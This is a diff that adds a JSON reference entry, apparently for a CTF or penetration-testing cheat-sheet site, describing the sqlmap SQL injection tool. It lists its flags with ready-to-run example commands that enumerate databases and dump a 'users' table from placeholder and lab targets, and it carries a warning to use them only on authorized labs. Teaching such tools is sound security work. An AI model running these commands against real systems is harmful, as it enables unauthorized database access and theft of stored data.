@@ -1,0 +1,53 @@
+{
+  "slug": "sqlmap",
+  "name": "sqlmap",
+  "category": "web",
+  "section": "ctf",
+  "summary": "Automatic SQL injection and database takeover tool.",
+  "syntax": "sqlmap [options]",
+  "description": "An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.",
+  "options": [
+    {
+      "flag": "-u",
+      "description": "Target URL.",
+      "example": "sqlmap -u \"http://target.com/page.php?id=1\""
+    },
+    {
+      "flag": "--dbs",
+      "description": "Enumerate DBMS databases.",
+      "example": "sqlmap -u \"http://target.com/page.php?id=1\" --dbs"
+    },
+    {
+      "flag": "--dump",
+      "description": "Dump DBMS database table entries.",
+      "example": "sqlmap -u \"http://target.com/page.php?id=1\" -D ctf -T users --dump"
+    },
+    {
+      "flag": "--batch",
+      "description": "Never ask for user input, use default behavior.",
+      "example": "sqlmap -u \"http://target.com/page.php?id=1\" --batch --dbs"
+    }
+  ],
+  "examples": [
+    {
+      "title": "Automated SQLi enumeration",
+      "command": "sqlmap -u \"http://10.10.10.20/vuln.php?id=1\" --current-db --dump",
+      "output": "[INFO] fetching current database: ctf_db\n[INFO] fetching tables for database: 'ctf_db'",
+      "explanation": "Automatically tests parameters and dumps database content."
+    }
+  ],
+  "useCases": [
+    "Exploiting SQL injection vulnerabilities in web CTF challenges"
+  ],
+  "warnings": "Only use against authorized test labs and CTF targets.",
+  "related": [
+    "gobuster",
+    "ffuf"
+  ],
+  "tags": [
+    "ctf",
+    "web",
+    "sqli",
+    "database"
+  ]
+}
